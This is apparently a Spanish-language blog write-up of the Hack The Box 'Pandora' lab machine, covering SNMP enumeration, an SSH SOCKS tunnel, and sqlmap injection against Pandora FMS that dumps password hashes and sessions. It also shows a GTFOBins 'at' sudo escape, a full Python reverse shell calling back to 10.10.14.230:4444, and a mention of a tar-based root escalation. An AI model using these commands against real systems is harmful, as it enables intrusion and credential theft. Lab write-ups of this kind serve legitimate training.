---
layout: post
author: Sergio Salgado
---
# [](#header-1)Pandora HtB

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
Esta maquina es una de las faciles de HtB, su sistema operativo es Ubuntu linux. E intentaremos llegar a las flags de la maquina.

- <a href="#desarrollo">Desarrollo</a>
Despues del primer escaneo, ingresamos al servicio web y mientras navegamos no encontramos nada importante. Pero si descubrimos un dominio, el cuel integraremos en nuestro archivo /etc/hosts. Para posteriormente, realizar otro escaneo dirigido al dominio.

![Nmap segundo scanning](/assets/images/pandora/nmap2PANDA.png)

Podemos observar que la maquina corre un servicio de snmpv1, el cual es usado para la administracion y monitoreo de la red. Y hasta la version 2 se mandan mensajes en texto limpio. Solamente la version 3 que es el mas reciente cuenta con encriptacion y autenticacion. SNMP almacena informacion en una estructura llamada MIB (Management Information Base). Esta es una estructura relacional que considera que informacion puede ser leida, escrita y accesible. Este utiliza identificadores OIDs. Pero esto nos es tan importante, solo es la informacion basica.

Para sacar informacion de la maquina que corre este servicio, la peticion se manda con un metodo GET a la maquina, con unstring para autentificarse el mismo. SNMP usa 2 strings diferentes llamados strings comunitarios, para autenticacion con maquinas. El string de solo lecturaes usualmente solo para informacion para lectura unicamente, y el atributo de lectura y escritura, son permisos para modificar alguna informacion. Lo importante de estos strings comunitarios, es que no pasan por ninguna encriptacion en hashes, son atomicos y faciles de crackear. Se utilizo esta <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt">lista</a> para encontrar los strings comunitarios de la maquina.

Intentaremos usar diferentes herramientas para descubrir informacion sobre este servicio encontrado 
Con el modulo scanner/snmp/snmp_login de msfconsole, encontramos la version del sistema operativo y del servicio snmp
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP y un community string que generalmente se usa llamado “public” 

Nos instalamos la herramienta
```sc
sudo apt-get install snmp-mibs-downloader
download-mibs
```

Ya que conocemos un string usado, podemos proceder a usarlo para acceder a los datos transmitidos con el comando:

```sc
snmpwalk -v 1 -c public panda.htb
```
![Primer scan con snmpwalk](/assets/images/pandora/snmpwalk1.png)
La herramienta anterior es un poco lenta y agresiva, para hacerlo mas rapido, podemos usar otra herramienta, que su sintaxis es:

```sc
braa public@10.10.11.136:.1.3.6.*
```
![Braa](/assets/images/pandora/braa.png)

Encontramos 3 palabras clave, las cuales pueden ser
- Email addresses
- SNMP community strings
- Password hashes
- Clear text passwords


Después con la herramienta snmpenum, seguiremos recopilando informacion de la maquina

```sc
snmpenum 10.10.11.136 public linux.txt
snmpwalk -c public -v2c -On 10.10.11.136

```
Despues de encontrar los strings comunitarios, se uso una herramienta llamada snmpwalk para enumerar toda la informacion que se pudo. 

```sc
snmpwalk -v 1 -c public panda.htb > snmpwalk-1.txt
```
![Segundo scan con snmpwalk](/assets/images/pandora/snmpwalk_pass.png)

Como podemos ver, se ha encontrado en texto plano un usuario y contrasena, asi que la usaremos para loggearnos por SSH en la maquina.

La flag de usuario esta en otro directorio de usuario, asi que buscaremos la manera de cambiar de usuario. El primer objetivo es **/var/www/html** y **/var/www/pandora**. El lado de html es visible para el publico, pero pandora es nuevo. Dentro del archivo /etc/hosts vemos unas asignaciones, asi que las usaremos como ventaja.

Si asumimos que estos hostnames entraran en el directorio de pandora, entonces necesitaremos establecer un tunel dinamico. Esto se puede hacer con:
```sc
ssh -D 9090 daniel@panda.htb
```

Usando este tunel, podemos ahora configurar un proxy para ver la pagina web.
Nota Estos deben ser SOCKS5 ya que este soporta resolucion de DNS.

![Configuracion de Proxy](/assets/images/pandora/proxy_config.png)

![Prueba del proxy](/assets/images/pandora/proxy_working.png)

Navegaremos a localhost.localdomain/pandora_console y nos mostrara una pagina para logearnos para algun software llamado pandora FMS. Para nustra suerte, existen muchos CVEs para este software, y este <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">post</a> especificamente nos muestra que los parametros **chart_generator.php** files **session_id** son vulnerables. Para usar sqlmap para esto, necesitaremos antes una gran herramienta llamada proxychains. Proxichains esta disenada para hacer una cadena de proxies que te permiten usar tus herramientas en otras maquinas sin tener que instalarlas en el otro lado. Para usarlo necesitas especificar el tunel dinamico en el archivo /etc/proxychains4.conf

```sc
socks5 127.0.0.1 9090 daniel HotelBabylon23
```
![Proxychain config file](/assets/images/pandora/proxychain_conf.png)

Despues de configurarlo podemos ejecutar el ataque sqli contra el archivo generador de caracteres. 

```sc
proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
``` 
![Sqlmaping with proxychain](/assets/images/pandora/sqlmap_pass.png)

La tabla en la que estamos interesados es **tpassword_history**. Despues de llegar a ella, obtenemos unas contrasenas con hashes para daniel y matt. Al ver los hashes, se puede ver que pueden ser MD5, o podemos utilizar la <a href="https://hashes.com/es/tools/hash_identifier">herramienta</a> para identificar que tipo de hashes se utilizaron.

```sc
proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -Ttpassword_history --dump
``` 

Tambien en los id de sesiones de php que estan guardados en la tabla **tsessions_php** 

```sc
proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -Ttsessions_php --dump
``` 

![Php sessions con sqlmap](/assets/images/pandora/php_sessions.png)

Ahora podemos copiar una de las sesiones de matt en el url y ver si funciona.

Y como lo mencionamos, esto nos trae al dashboard. Desafortunadamente a pesar de esto , no se pudo establecer una shell mediante alguna injeccion de sql o algo visible. Pero utilizando esta <a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py">herramienta</a>, pudimos entrar como matt y leer la primer flag en /home/matt/user.txt.

```sc
proxychains python3 [pythontool].py -t localhost.localdomain
``` 

![Admin cookie](/assets/images/pandora/admin_cookie.png)


Hasta este punto, nos damos cuenta de que estamos en un ambiente restringido, ya que el comando sudo nos arrojo una respuesta extrana que se ha visto en otras maquinas. Asi que para seguir con esto hay que revisar los binarios para suid bits, y ahi encontraremos en **/usr/bin/at** cosas de sudo. Una vez con esto, podemos usar <a href="https://gtfobins.github.io/gtfobins/at/#sudo">el script de gtfobins</a> y nos permitira movernos a travez de la restriccion y asi poder navegar con una shell con privilegios elevados.

Para poder ejecutar comandos con sudo, sin restricciones:

```sc
echo "/usr/bin/at <$(tty) >$(tty) 2>$(tty)" | sudo at now; [COMMAND]
``` 
Para tener una shell mas bonita, sumamos el script anterior y le adjuntamos el reverse shell de python, usamos el reverse shell hecho en python

```py
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.230",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
``` 
Del lado de kali, ejecutamos el netcat:

```sc
nc -lvp 4444
``` 
Cuando estaba intentando quitarme la restriccion , encontre un binario en /usr/bin llamado pandora_backup. Lo descargue a mi maquina e hice unas pruebas y al parecer utiliza el comando tar para comprimir archivos. Asi que cree un archivo tar malicioso y lo ejecute para ganar el privilegio de root.


